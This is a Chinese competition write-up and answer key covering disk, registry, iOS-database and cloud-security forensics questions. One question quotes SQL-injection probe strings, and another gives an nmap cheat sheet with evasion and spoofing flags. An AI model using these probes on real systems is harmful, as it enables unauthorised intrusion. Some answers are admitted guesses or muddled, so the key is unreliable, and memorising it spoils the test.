macOS 中的一个隐藏系统文件夹，用于存储文件的版本历史。它被引入以支持 “版本控制” 功能，允许用户在应用程序（如 TextEdit、Pages、Keynote 等）中查看和恢复文档的旧版本。 主要功能和作用： 版本控制：当用户编辑文档时，macOS 会自动创建快照并存储在 .DocumentRevisions-V100 中。用户可以通过支持版本控制的应用程序查看文档的历史记录，恢复到某个之前的版本。 临时存储：这个文件夹还可能包含未保存的更改内容，防止在程序崩溃或系统故障时丢失数据。 存储位置：通常位于系统磁盘的根目录中，并且是一个隐藏文件夹。macOS 会自动管理它，用户通常不需要手动处理其中的内容。 清理：由于其作用， .DocumentRevisions-V100 可能会占用一定的存储空间，特别是在长时间没有清理的情况下。macOS 会自动清理旧的文档版本，但如果需要释放空间，可以通过终端或磁盘清理工具在不影响系统的情况下安全删除它。 由此可知被删除的文件就是 yeah.jpg # 30. [填空题] 请提供’Mac OS.img’ 映像文件被 “fsck” 命令检查的具体时间。(1 分) 120230713-082435 看了别的师傅的 wp 结合 chatgpt 在 macOS 中， fsck （file system consistency check） 是一种用于检查和修复文件系统的工具。当 fsck 运行时，特别是检查或修复 HFS+（Hierarchical File System Plus）卷时，它会对文件系统的内部数据结构进行检查和更改，其中包括系统使用的 “Private Data” 文件。这可能导致文件系统元数据的修改时间与 fsck 检查时间产生关联。 原因分析： HFS+ Private Data 文件的修改： 在 HFS + 文件系统中，Private Data 区域用于存储系统文件、日志信息、以及其他系统相关的隐藏文件或目录（如 .journal 、 .DocumentRevisions-V100 等）。这些文件可能会记录文件系统的状态信息。 fsck 在执行修复时，可能会修改这些数据以确保文件系统的一致性。因此，运行 fsck 会更新与 HFS+ Private Data 相关文件的修改日期。 与 .img 文件的关联： 当 Mac OS.img 文件（一个磁盘映像文件）被挂载或修复时，macOS 会将其视为一个 HFS + 卷进行检查，这可能会在挂载或修复过程中修改 Private Data 区域，从而更新元数据。 这种情况下， fsck 检查的时间可能会与该磁盘映像文件中 Private Data 的修改时间匹配，因为 fsck 执行的检查或修复会直接影响到文件系统的元数据记录。 时间戳关联： macOS 会记录每个文件和目录的访问、修改和创建时间。当 fsck 检查和修复操作时，它可能会更新这些时间戳，尤其是涉及文件系统的元数据文件时。 总的来说， fsck 对 HFS + 卷的检查和修复操作，特别是当卷中存在与系统相关的 Private Data 文件时，通常会导致修改时间与检查时间接近或一致。这也是 fsck 对 Mac OS.img 文件执行操作时与 HFS+ Private Data 修改时间相关的原因。 大概意思是 fsck 命令会检查和修复文件系统，所以会修改 HFS+ Private Data 文件，结合 X-way 可以看到修改文件的时间需要修改时区 所以是 20230713-082435 # 31. [单选题] 在 .dmg 档中删除了多少个文件？(1 分) A. 1 B. 2 C. 3 D. 4 1D .Trashes 是 MacOS 的废纸篓，相当于 Windows 的回收站 $Recycle.bin ，所以看一下 Trashes 就知道了 所以是 4 个 # 32. [填空题] Elvis Chui 总共登入过该计算机多少次？根据 ‘Window Artifacts.E01’ 内的 Windows 注册表记录 (1 分) 111 查看用户信息里的 Elvis Chui 可以看到登录次数 11 次 # 33. [单选题] 该计算机的操作系统是在哪一个时区？(1 分) A. UTC +4 B. UTC +8 C. UTC -8 D. UTC -4 1B 系统信息中的时区信息 # 34. [单选题] 该计算机的操作系统于何时安装？(以计算机系统时区回答) (1 分) A. 2023-07-13 19:18:14 B. 2023-07-13 11:18:14 C. 2023-07-13 03:18:14 D. 2023-07-12 19:18:14 1B # 35. [多选题] 哪 (几) 个程序会于操作系统启动时自动执行？(1 分) A. Avast B. Steam C. OneDrive D. QQ 1ABC 用户痕迹可以看到 # 36. [单选题] 该计算机内安装了以下哪一个程序？(1 分) A. QQ B. WPS Office C. Opera D. Kaspersky 1B 安装软件中可以查看 # 37. [填空题] 计算机内的 OneDrive 程序版本是什么？(1 分） 121.220.1024.0005 安装软件找到 Microsoft OneDrive 即可查看版本号 # 38. [填空题] 计算机有一个正在连接的网络接口，该接口连接 DHCP 服务器的 IP 地址是多少？提示：以 IPV4 格式回答 (1 分) 1192.168.88.254 系统痕迹系统信息中找到网络配置 # 39. [单选题] 该计算机何时连接过一只 U 盘？(以计算机系统时区回答) (1 分) A. 2023-07-13 11:48:26 B. 2023-07-13 03:48:29 C. 2023-07-12 19:48:29 D. 2023-07-13 11:48:29 1D 11:48:27-11:28:39 的区间内选 # 40. [多选题] Elvis Chui 将哪几个文本文件放在回收站中？(3 分) A. $+D10I76A74P.txt B. Holiday schedule 2023-07-16.txt C. Holiday schedule 2023-07-13.txt D. Minute on 2023-07-01.txt E. Minute on 2023-07-10.txt 1BE 仿起来看看 # 41. [单选题] Elvis Chui 在什么时间删除了第一个文本文件？(以计算机系统时区回答) (3 分) A. 2023-07-13 11:50:15 B. 2023-07-13 03:49:45 C. 2023-07-13 03:50:15 D. 2023-07-13 11:49:45 1D 回收站删除记录查看 # 42. [填空题] Elvis Chui 删除的第一个文本文件的文件名是什么？提示：请用小写字母回答及需列明文件格式。如文件名字内有空格位置，请用_标示。例如: go_to_school.docx (2 分) 1holiday_schedule_2023-07-16.txt 同上 # 43. [单选题] Elvis Chui 删除的第一个文本文件在什么时间创建？(以计算机系统时区回答) (2 分) A. 2023-07-13_11:42:39 B. 2023-07-13_11:50:49 C. 2023-07-13_11:49:45 D. 2023-07-13_11:45:22 1D # 44.[填空题] Elvis Chui 计划于 2023 年 7 月 15 日 20 点 5 分有什么活动？提示：答案请与文件内的文字与大细阶相同 (1 分) 1Movie 还原日程表 # 45. [填空题] 该计算机执行 STEAM.EXE 总共多少次？提示：请用阿拉伯数字作答 (1 分) 17 # 46. [单选题] 一个名为 “Account” 的数据库表拥有 5 个 &quot;列&quot;，以下哪一个指令会产生错误讯息？ (提示: 1. 数据库是拥有正常默认的系统表格 2. 错误信息是关于 &quot;超出上限&quot; 的错误) (1 分) A. SELECT * from Account WHERE name=‘Alex’ OR ‘1’=1 B. SELECT * FROM Account WHERE name=‘Bill’ UNION SELECT NULL, NULL, NULL, NULL C. SELECT * from Account WHERE name=‘Candy’ ORDER BY 6 D. SELECT name FROM sys.tables 1C sql 注入常识 # 47. [单选题] 当客户端收到一个页面请求的 HTTP 状态代码为 304 时，以下哪种情况最有可能发生？(1 分) A. 页面将显示错误 B. 页面将从浏览器缓存中加载 C. 浏览器将显示 “访问被拒绝” D. 服务器将复位向客户端到另一个资源 1B 链接 [HTTP 状态码完整指南 - 阿里云开发者社区](https://developer.aliyun.com/article/1411397#:~:text=HTTP 状态码（HTTP Status Code）是用以表示网页服务器超文本传输协议响应状态的 3 位数字代码。 它由 RFC 2616 规范定义的，并得到 RFC,2518、RFC 2817、RFC 2295、RFC 2774 与 RFC 4918 等规范扩展。) HTTP 状态码列表 1xx Informational 1XX 的状态码是在 HTTP/1.1 中引入的，它们是信息性的状态码，是临时的，表示请求已被接受，需要继续处理。这些状态码并没有提供太多有用的信息，我们可能永远看不到 1XX 相关的状态码。 （1）100 Continue 服务器已收到浏览器的请求标头，并且现在已准备好发送请求正文。这使得请求过程更加高效，因为它可以防止浏览器发送正文请求，即使标头已被拒绝。 （2）101 Switching Protocols 服务器已经接受了客户端的请求，并将通过 Upgrade 消息头通知客户端采用不同的协议来完成这个请求。在发送完这个响应最后的空行后，服务器将会切换到在 Upgrade 消息头中定义的协议。 （3）102 Processing 服务器已经收到并正在处理请求，目前还没有响应。这样可以防止客户端超时，并假设请求丢失。 （4）103 Early hints 在服务器响应的 HTTP 消息之前返回一些响应头。该状态码用于允许用户代理预加载资源，同时服务器准备响应。 2xx Success 2xx 状态码表示客户端的请求被成功接收、理解和接受。 （1）200 OK 表示客户端发来的请求被服务器端正常处理了。从 SEO 的角度来看，200 OK 状态码是功能页面的完美状态码，所有链接页面都在正常工作。200 表示搜索引擎爬虫可以成功爬取该页面并将其放入其搜索引擎中。 （2）201 Created 服务器完成了浏览器的请求，因此创建了一个或多个新资源。 （3）202 Accepted 服务器已接受浏览器的请求，但仍在处理中。该请求最终可能会也可能不会进行响应。 （4）203 Non-authoritative Information 使用代理时可能会出现此状态代码。这意味着代理服务器从源服务器收到了 200 状态代码，但在将响应传递给浏览器之前已对其进行了修改。 （5）204 No Content 该状态码表示客户端发送的请求已经在服务器端正常处理了，但是没有返回的内容，响应报文中不包含实体的主体部分。一般在只需要从客户端往服务器端发送信息，而服务器端不需要往客户端发送内容时使用。 （6）205 Reset Content 服务器端成功处理了请求，且没有返回任何内容。但是与 204 响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。 （7）206 Partial Content 该状态码表示客户端进行了范围请求，而服务器端执行了这部分的 GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。 （8）226 IM Used 服务器已成功处理浏览器的 GET 方法，以检索已缓存资源的更新版本。通常，当请求的资源有一个或多个轻微修改时返回响应。 3xx Redirection 3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。 （1）300 Multiple Choices 有时，服务器可能会响应多种可能的资源来满足浏览器的请求。300 状态码意味着浏览器现在需要在它们之间进行选择。当有多个可用的文件类型扩展名时，可能会发生这种情况。 （2）301 Moved Permanently ** 永久重定向。** 已为目标资源分配了一个新的永久 URI。新的 URI 会在 HTTP 响应头中的 Location 首部字段指定。若用户已经把原来的 URI 保存为书签，此时会按照 Location 中新的 URI 重新保存该书签。同时，搜索引擎在抓取新内容的同时也将旧的网址替换为重定向之后的网址。 （3）302 Found ** 临时重定向。** 请求的资源被分配到了新的 URI，希望用户（本次）能使用新的 URI 访问资源。和 301 Moved Permanently 状态码相似，但是 302 代表的资源不是被永久重定向，只是临时性质的。也就是说已移动的资源对应的 URI 将来还有可能发生改变。 若用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。同时，搜索引擎会抓取新的内容而保留旧的网址。因为服务器返回 302 代码，搜索引擎认为新的网址只是暂时的。 使用场景： 未登陆的用户访问用户中心重定向到登录页面。 访问 404 页面重新定向到首页。 （4）303 See Other 由于请求对应的资源存在着另一个 URI，应使用 GET 方法定向获取请求的资源。 303 状态码和 302 Found 状态码有着相似的功能，但是 303 状态码明确表示客户端应当采用 GET 方法获取资源。303 状态码通常作为 PUT 或 POST 操作的返回结果，它表示重定向链接指向的不是新上传的资源，而是另外一个页面，比如消息确认页面或上传进度页面。而请求重定向页面的方法要总是使用 GET。 注意： 当 301、302、303 响应状态码返回时，几乎所有的浏览器都会把 POST 改成 GET，并删除请求报文内的主体，之后请求会再次自动发送。 301、302 标准是禁止将 POST 方法变成 GET 方法的，但实际大家都会这么做。 （5）304 Not Modified 浏览器缓存相关。该状态码表示客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。 带条件的请求（Http 条件请求）：使用 Get 方法 请求，请求报文中包含（ if-match 、 if-none-match 、 if-modified-since 、 if-unmodified-since 、 if-range ）中任意首部。 状态码 304 并不是一种错误，而是告诉客户端有缓存，直接使用缓存中的数据。返回页面的只有头部信息，是没有内容部分的，这样在一定程度上提高了网页的性能。 （6）305 Use Proxy 服务器需要代理才能返回请求的资源。此响应代码当前未使用，因为当前大多数浏览器由于安全问题不支持它。 （7）307 Temporary Redirect 临时重定向。该状态码与 302 Found 有着相同含义，尽管 302 标准禁止 POST 变成 GET，但是实际使用时还是用了。307 会遵守浏览器标准，不会从 POST 变成 GET。但是对于处理请求的行为时，不同浏览器还是会出现不同的情况。规范要求浏览器继续向 Location 的地址 POST 内容。规范要求浏览器继续向 Location 的地址 POST 内容。 （8）308 Permanent Redirect 永久重定向，当前及未来的请求重定向到了新的 URL。 4xx Client errors （1）400 Bad Request 请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。 （2）401 Unauthorized 发送的请求需要有通过 HTTP 认证 (BASIC 认证、DIGEST 认证) 的认证信息。若之前已进行过一次请求，则表示用户认证失败。返回含有 401 的响应必须包含一个适用于被请求资源的 WWW-Authenticate 首部用以质询 (challenge) 用户信息。当浏览器初次接收到 401 响应，会弹出认证用的对话窗口。 （3）402 Payment Required 为数字支付系统保留的。不过，它并没有被广泛使用。 （4）403 Forbidden 客户端请求已被拒绝，因为客户端无权访问内容。与 401 不同，服务器知道客户端的身份，但由于他们无权查看内容，因此服务器拒绝提供正确的响应。 （5）404 Not Found 服务器上无法找到请求的资源，但将来可能可用。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。 （6）405 Method Not Allowed 服务器识别到浏览器使用的 HTTP 请求方法，但需要使用不同的方法才能提供所需的资源。服务器应该总是允许客户端使用 GET 和 HEAD 方法进行访问。 客户端可以通过 OPTIONS 方法（预检）来查看服务器允许的访问方法，如下 javascript 复制代码 1Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE （7）406 Not Acceptable 服务器通知客户端没有资源符合浏览器请求的标准。 （8）407 Proxy Authentication Required 客户端必须首先通过代理进行身份验证。 （9）408 Request Timeout 当服务器在等待来自浏览器的完整请求时超时时会生成此状态码。换句话说，服务器没有收到浏览器发送的完整请求。一种可能的原因就是网络拥塞导致浏览器和服务器之间的数据包丢失。 （10）409 Conflict 服务器无法处理浏览器的请求，因为与相关资源存在冲突。这有时是由于多个同时编辑而发生的。 （11）410 Gone 请求的资源将来将不再可用。 （12）411 Length Required 请求的资源需要客户端指定一定的长度，通过 Content-Length 来定义。 （13）412 Precondition Failed 服务器不满足请求头字段中指示的一个或多个先决条件。 （14）413 Payload Too Large 服务器拒绝处理请求，因为请求的负载大于服务器能够或愿意处理的。虽然服务器可能会关闭连接以阻止客户端继续请求，但它应该生成一个 Retry-After 头字段以及客户端可以在多长时间后重试。 （15）414 Request-URI Too Long 浏览器发出的请求无法被服务器处理，因为客户端将太多数据编码为查询字符串，然后作为 GET 方法发送。 （16）415 Unsupported Media Type 请求已被服务器拒绝，因为它不支持请求数据的媒体格式。 （17）416 Requested Range Not Satisfiable 请求的 Range 头中指定的范围无法满足。原因可能是给定范围超出了目标 URI 数据的大小。 （18）417 Expectation Failed 服务器无法满足请求的请求头的 Expect 字段中指定的要求。 （19）421 Misdirected Request 浏览器的请求已被重定向到其他服务器，该服务器无法产生响应。 （20）422 Unprocessable Entity 浏览器发出的请求中存在语义错误，服务器无法处理。 （21）423 Locked 对所需资源的访问被拒绝，因为它已被锁定。 （22）424 Failed Dependency 浏览器发出的请求失败，因为它依赖于另一个请求，而该请求失败了。 （23）426 Upgrade Required 当服务器拒绝使用当前协议执行给定的请求时，它可能愿意在客户端升级到不同的协议后这来执行请求。 （24）428 Precondition Required 服务器要求在处理请求之前指定条件。 （25）429 Too Many Requests 用户在给定的时间内发送了太多请求（速率限制）时，这是由服务器生成的。这有时可能是由于机器人或脚本试图访问站点而造成的。 （26）431 Request Header Fields Too Large 服务器无法处理请求，因为标头字段太大。这可能是单个标头字段或所有标头字段存在问题。 （27）451 Unavailable For Legal Reasons 服务器的运营商收到了禁止访问请求的资源的要求。 （28）499 Client closed request 当 nginx 正在处理请求时，客户端关闭了连接，nginx 就会返回此状态码。 5xx Server Error 5XX 的响应结果表明服务器本身发生错误。 （1）500 Internal Server Error 服务器端在执行请求时发生了错误。也有可能是应用存在 bug 或某些临时的故障。 （2）501 Not Implemented 请求无法处理，因为服务器不支持。 （3）502 Bad Gateway 该扮演网关或代理角色的服务器从上游服务器中接收到的响应是无效的。注意，502 错误通常不是客户端能够修复的，而是需要由途经的服务器或者代理服务器对其进行修复 （4）503 Service Unavailable 服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。 使用场景： 服务器停机维护时，主动用 503 响应请求； nginx 设置限速，超过限速，会返回 503。 （5）504 Gateway Timeout 网关或者代理的服务器无法在规定的时间内获得想要的响应。它是 HTTP 1.1 中新加入的。 使用场景： 代码执行时间超时； 代码发生了死循环。 （6）505 HTTP Version Not Supported 请求中使用的 HTTP 版本不受服务器支持。 （7）506 Variant Also Negotiates 服务器内部配置错误。 （8）507 Insufficient Storage 服务器无法存储完成请求所必须的内容。 （9）508 Loop Detected 服务器在处理请求时检测到无限循环。 （10）510 Not Extended 服务器需要进一步扩展才能满足请求。 （11）511 Network Authentication Required 客户端需要进行身份验证才能获得访问权限。 # 48. [单选题] 在 HTML 注入攻击中，以下哪种情况最有可能出现？(1 分) 1A 答案是 A，还需要学习，gpt 一下了解一下用途吧 A. 这个表单指向一个外部地址，可能被用来进行 钓鱼攻击（Phishing）。不过，它不涉及直接的 HTML 注入。 B. 这条代码嵌入了一个外部的 Flash 文件。虽然 Flash 文件本身可能有漏洞，但与 HTML 注入攻击无关。 C. 这一段代码插入了一段 JavaScript 脚本。这种注入是典型的 XSS (跨站脚本攻击)，属于 HTML 注入攻击的常见方式。 D. 这一行 PHP 代码涉及文件包含，可能会导致文件包含漏洞，但和 HTML 注入无关。 # 49. [单选题] 如何预防 HTML 注入攻击？(1 分) A. 密钥管理 B. 同源策略执行 C. 会话验证 D. 输入过滤 1D 和防御 sql 注入一个道理，过滤输入的内容是最直接最有效的方法 # 50. [单选题] 同源策略在浏览器内存中提供 Web 应用程序安全的目的是什么？(3 分) A. 防止客户端访问恶意网站 B. 禁止 Web 会话运行外部脚本 C. 控制来自不同服务器的代码之间的交互 D. 阻止浏览器运行危险或有害的脚本 1C 同源策略（Same-Origin Policy）是浏览器中的一种重要安全机制，其主要目的是保护 Web 应用程序的数据安全，防止不同来源的资源相互访问，从而防止跨站点脚本攻击（XSS）、跨站点请求伪造（CSRF）等常见的网络攻击。具体来说，同源策略通过以下方式提升 Web 应用的安全性： 防止未经授权的跨站请求：同源策略限制了网页中 JavaScript 只能访问同源（协议、主机名和端口相同）的资源，防止了恶意网站在用户不知情的情况下向其他站点发起请求，盗取用户的敏感信息。 保护用户的会话数据：不同来源的站点无法直接访问彼此的 Cookie、LocalStorage 或其他存储在浏览器内存中的数据，这有助于保护用户的会话信息，避免恶意站点利用这些信息冒充用户身份。 防止数据泄露：通过限制跨域资源的访问，同源策略可以确保用户的敏感数据不会被恶意站点读取或劫持，减少数据泄露的风险。 总结 同源策略通过强制网页只能访问同源资源来提高 Web 应用的安全性，保护用户的敏感数据不被跨域的恶意站点获取。 # 51. [填空题] 编写 Nmap 命令以显示以下结果。(2 分) 1nmap --script http-robots.txt www.baidu.com nmap 常用命令 主机发现 iR 随机选择目标 -iL 从文件中加载 IP 地址 -sL 简单的扫描目标 -sn Ping 扫描 - 禁用端口扫描 -Pn 将所有主机视为在在线，跳过主机发现 -PS [portlist] （TCP SYN ping） 需要 root 权限 -PA[portlist] （TCP ACK ping） -PU[portlist] （UDP ping） -PY [portlist] （SCTP ping） -PE/PP/PM ICMP 回显，时间戳和网络掩码请求探测 -PO [协议列表] IP 协议 Ping -n/-R 从不执行 DNS 解析 / 始终解析 [默认：有时] –dns-servers 指定自定义 DNS 服务器 –system-dns 使用 OS 的 dns 服务器 –traceroute 跟踪到每个主机的跃点路径 扫描技术 -sS 使用 TCP 的 SYN 进行扫描 -sT 使用 TCP 进行扫描 -sA 使用 TCP 的 ACK 进行扫描 -sU UDP 扫描 -sI Idle 扫描 -sF FIN 扫描 -b&lt;FTP 中继主机&gt; FTP 反弹扫描 端口规格和扫描顺序 -p 扫描指定端口 –exclude-ports 从扫描中排除指定端口 -f 快速模式 - 扫描比默认扫描更少的端口 -r 连续扫描端口 - 不随机化 –top-ports 扫描最常用的端口 服务 / 版本探测 -sV 探测服务 / 版本信息 –version-intensity 设置版本扫描强度（0-9） –version-all 尝试每个强度探测 –version-trace 显示详细的版本扫描活动（用于调试） 脚本扫描 -SC 等效于 --script=defult –script = , 以逗号分隔的目录，脚本文件或脚本类别 –script-args = &lt;n1=v1, n2=v2&gt; 为脚本提供参数 –script-args-file = 文件名 从文件名中加载脚本参数 –script-trace 显示发送和接受的所有数据 –script-updatedb 更新脚本数据库 –script-help= 显示有关脚本的帮助 操作系统检测 -o 启用 os 检测 –osscan-limit 将 os 检测限制为可能的目标 –osscan-guess 推测操作系统检测结果 时间和性能 –host-timeout 设置超时时间 –scan-delay 设置探测之间的时间间隔 -T &lt;0-5&gt; 设置时间模板，值越小，IDS 报警几率越低 防火墙 / IDS 规避和欺骗 -f 报文分段 -s 欺骗源地址 -g 使用指定的本机端口 –proxies &lt;url,port&gt; 使用 HTTP/SOCK4 代理 -data 想发送的数据包中追加自定义的负载 –data-string 将自定义的 ACSII 字符串附加到发送数据包中 –data-length 发送数据包时，附加随机数据 –spoof-mac MAC 地址欺骗 –badsum 发送带有虚假 TCP/UNP/STCP 校验和的数据包 输出 -oN 标准输出 -oX XMl 输出 -oS script jlddi3 -oG grepable -oA 同时输出三种主要格式 -v 信息详细级别 -d 调试级别 –packet-trace 跟踪发送和接收的报文 –reason 显示端口处于特殊状态的原因 –open 仅显示开放的端口 杂项 -6 启动 Ipv6 扫描 -A 启动 Os 检测，版本检测，脚本扫描和 traceroute -V 显示版本号 -h 帮助信息 # 52. [填空题] 除了使用 Nmap，还有其他方法可以验证上述结果，其中一种方法是使用 Web 浏览器浏览 URL，编写 URL 以显示上述结果。（答案不要包含 “http://”）(2 分) 1www.baidu.com/robots.txt # 53. [单选题] 根据 ’ com.apple.ios.StoreKitUIService.plist ’ , 这部电话是什么型号？(1 分) A. SAMSUNG S23 B. iPhone X C. iPhone XR D. iPhone XS E. iPhone 13 1C # 54. [单选题] 根据 com.apple.ios.StoreKitUIService.plist，上述电话的文件系统是什么？(1 分) A. FAT32 B. NTFS C. HFS+ D. APFS E. EXT4 1D # 55. [多选题] 根据 ChatStorage.sqlite，哪些对话已锁定？(3 分) A. 447380449879@.whatsapp.net B. 79096209701@.whatsapp.net C. 923109725619@.whatsapp.net D. 85256026169@.whatsapp.net E. status@broadcast 1ABC 打开查看 ZWACHATSESSION，CHATSESSION 就是存储对话的表，里面有三个账号的 FLAGS 值相比其他账号大上不少，猜测是锁定的意思 # 56. [填空题] 根据 ChatStorage.sqlite，有多少段录音对话？提示：请以阿拉伯数字作答 (2 分) 145 看 ogg 文件 # 57. [单选题] Apple Cocoa Core Data timestamp 是由什么时间开始？(1 分) A. 2001 年 1 月 1 日 B. 1970 年 1 月 1 日 C. 2006 年 1 月 1 日 D. 1960 年 1 月 1 日 1A Core Data 时间戳的起始日期是 2001 年 1 月 1 日 # 58.[填空题] 根据 Photos.sqlite 数据库中，有多少段视频可能涉及 WhatsApp？提示：请以阿拉伯数字作答 (2 分) 17 可以使用 sql 语句查询 也可以直接找，在 ZIMPORTEDBYBUNDLEIDENTIFIER 过滤 WhatsApp，在 ZORIGINALFILENAME 过滤 mp4 # 59. [多选题] 根据 Photos.sqlite 数据库中，下列哪个选项对 IMG_0008.HEIC 的描述是错的？(3 分) A. 由第三方软件拍摄 B. 经过修改 C. 由后镜拍摄 D. 用 ISO200 拍摄 E. 没有储存经纬度 1ABCD 表示实在是不会做，跟着师傅们的 wp 是选 ADE 在 ZASSET 表和 ZEXTENDEDATTRIBUTES 中可以找到一些有用的，ZASSET 表搜索 IMG_0008.HEIC，记录 pk 值 491 在表 ZEXTENDEDATTRIBUTES 中，过滤 491 可以看到经纬度、本机拍照、后置摄像头 iso160 # 60. [填空题] 根据 ’ sms (ios).db ’ 的资料，全局唯一标识符 (GUID): DD31C26F-1D72-DE0F-431E-EF98F104402D 显示的信息是什么？提示：答案需要与信息一样 (答案包括中文字、阿拉伯数字与符号) (1 分) 1你的 Uber 驗證碼為 3666. 請勿分享此驗證碼. # 61. [多选题] 根据 ’ com.burbn.instagram.plist ’ 及 ’ com.facebook.Facebook.plist ’ 手机安装了实时通讯软件 Facebook 及 Instagram 的那个版本？(1 分) A. Instagram (Version 278.0.0.19.115) B. Facebook (Version 410.0.0.41.116) C. Instagram (Version 279.0.0.23.112) D. Facebook (Version 410.0.0.26.115) E. Instagram (Version 278.0.0.25.115) F. Facebook (Version 410.0.0.57.116) 1AB # 62. [填空题] 根据 ’ ChatStorage (ios).sqlite ’ , 用户数据 Peter Chow (85262012141) 在什么日期和时间 (以 UTC +8 时区) 曾经通过实时通讯软件送出一个信息 (内容为: I am already home)? 提示：以 UTC +8 时区作答，并以 YYYY-MM-DD_HH:MM:SS 格式作答 例如：2023-01-01_10:01:01 (答案无需输入 UTC +8) (2 分) 12023-04-01 11:21:51 先换算出 2001.1.1 的时间戳 978307200 # 63. [填空题] 根据影片 IMG_0687.MOV 的原数据，找出影片拍摄时间？提示：以 UTC +8 时区作答，并以 YYYY-MM-DD_HH:MM:SS 格式作答 例如：2023-01-01_10:01:01 (答案无需输入 UTC +8) (1 分) 12023-06-06_18:11:29 不会。。。 # 64. [单选题] 根据 ’ CallHistory (ios).storedata '，哪份表格显示了通话记录？(2 分) A. ZCALLBPROPERTIES B. ZCALLRECORD C. Z_2REMOTEPARTICIPANTHANDLES D. Z_METADATA E. Z_MODELCACHE F. Z_PRIMARYKEY 1B # 65. [填空题] 根据 ’ com.apple.sharingd.plist '，这部手机的隔空投送的身份标识号 (AirDrop ID) 是什么？提示：请以阿拉伯数字与小写字母作答 (3 分) 12abd0940fbdc # 66. [填空题] 根据 ’ Accounts3.sqlite '，这部手机的苹果使用者账号 (Apple ID) 是什么？提示：请以电邮格式作答 (例:jack2023@hotmail.com) (2 分) 1foratcd2023@gmail.com # 67. [单选题] 哪一行代码的是负责更新在 GitHub 使用中的 .journal 文件的更新历史记录？(1 分) A. 08 B. 13 C. 16 D. 17 1A git commit 是提交更改，-m 是指定消息 # 68. [单选题] 下列哪一行 AWS S3 Bucket 授权策略中的设置有问题？(1 分) A. 2 B. 7 C. 8 D. 9 1B “Principal”:&quot;*&quot;。这个 * 即通配符，意为允许任何人访问，这是很危险的设置。 # 69. [单选题] 以下哪项是多重身份验证 (MFA) 的示例？(1 分) A. PIN 码和软件令牌 B. 指纹和视网膜扫描 C. 用户名和密码 D. 一次性短信代码和硬件令牌 1A # 70. [单选题] AWS 用家在户口网络进行设定，而这些设定会记录用户或第三者的活动。第 11 行代码中的设定可以找到哪些用户或第三者的活动信息？(2 分) A. User Name 用户的名称 B. User Source 用户的来源 C. Attacker Name 攻击者的名称 D. Attacker Source 攻击者的来源 1D 蜜罐 opencanary 这个就不是给正常用户登录的，能给它发请求的大多都是攻击者。sources 的这个文件名就已经说明是记录来源了。 # 71. [单选题] AWS 用户设置了一个 VPC，IP 地址范围为 10.0.0.0-10.0.0.24。下列哪个 IP 地址用于 DNS？(2 分) A. 10.0.0.0 B. 10.0.0.1 C. 10.0.0.2 D. 10.0.0.3 1C VPC 有自己的一套配置规则，不能套用常规的计网知识 在具有 CIDR 块 10.0.0.0/24 的子网中，以下五个 IP 地址是保留的： 10.0.0.0：网络地址。 10.0.0.1：由 AWS 保留，用于 VPC 路由器。 10.0.0.2：由 AWS 保留。DNS 服务器的 IP 地址是 VPC 网络范围的基址 + 2。对于包含多个 CIDR 块的 VPC， DNS 服务器的 IP 地址位于主要 CIDR 中。我们还为 VPC 中的所有 CIDR 块预留了每个子网范围加二的基址。 10.0.0.3：由 AWS 保留，供将来使用。 10.0.0.255：网络广播地址。我们在 VPC 中不支持广播，因此我们会保留此地址。 # 72. [单选题] 以下哪种类型的云服务用于操作系统和网络？ (1 分) A. 软件即服务 B. 平台即服务 C. 基础架构即服务 D. 数据即服务 1C # 73. [单选题] 以下哪项是 Bastionhost 的特点？ (2 分) A. 包含敏感信息 B. 无法访问内部系统 C. 限制暴露的服务 D. 没有连接到互联网 1C Bastionhost 是一种位于安全网络边界的服务器，用于提供对内部网络的访问控制。它的主要特点是限制暴露的服务，即只暴露必要的服务和端口，以减少潜在的攻击面。Bastionhost 通常用于跳板或代理访问内部系统，以增加对内部网络的安全性。 # 74. [单选题] 在 Linux 系统中，哪个命令可以用于创建文件系统？ (1 分) A. mount /dev/sda3 /mnt/usb B. mkfs-ext4 /dev/sda2 C. mkfs-ext3 /sys/sda1 D. pvcreate /dev/sda E. genfstab -U -p /mnt 1B # 75. [单选题] 'Link’实际上是指向 LINUX 系统中另一个文件或文件夹的指标。以下哪个命令可以产生以下结果？ (2 分) A. link -s testing.txt shotcut-testing.txt B. ln -s shotcut.txt testing.txt C. ln testing.txt shotcut-testing.txt D. ln -s testing.txt shotcut-testing.txt E. ln shotcut.txt testing.txt 1C -s 是软链接参数，但是因为两个文件大小一样，所以是硬链接，shotcut 是快照的意思，所以应该是 shotcut-testing.txt 作为链接文件。 # 76. [单选题] 以下哪个命令用于在 Linux 系统中创建分区？ (1 分) A. gdisk /dev/sde B. mke2fs /dev/sdb1 -t ext4 C. mount /dev/sdc1 /mnt/fs_home D. fdisk -lu E. lvcreate -l +200 /dev/vg00/log/vol-00 1A gdisk 是一个用于 GPT 磁盘分区的工具。 # 77. [单选题] 一个系统管理员要扩展运行在 LVM 系统中的服务器存储。以下哪个命令可以用于扩展 LVM 中的逻辑卷？ (1 分) A. lvdisplay /dev/vg02/vol-01 B. lvcreate -n /dev/vg02 -l 200 C. lvextend -n /dev/vg02 -l +200 D. lvscan -l +200 /dev/vg02/vol-01 E. lvresize -l +200 /dev/vg02/vol-01 1E lvresize 命令用于调整逻辑卷的大小，选项 - l + 200 表示将逻辑卷扩展 200 个逻辑区或扇区大小 # 78. [单选题] 一个系统管理员编写了一个 bash 代码来构建一个 RAID 系统，将要实现什么类型的 RAID？ (2 分) A. RAID 0 B. RAID 1 C. RAID 1+0 D. RAID 0+1 E. 这个代码不起作用 (No effect) 1C 先创建了两个 raid 1，然后创建了一个 raid 0 所以是 raid 1+0 # 79. [单选题] 以下是运行在 LINUX 服务器中的服务清单。以下哪个命令可以关闭 “bluetooth.service” 服务？ (3 分) A. systemctl kill bluetooth.service B. systemctl disable bluetooth.service C. systemctl down bluetooth.service D. systemctl stop bluetooth.service E. systemctl 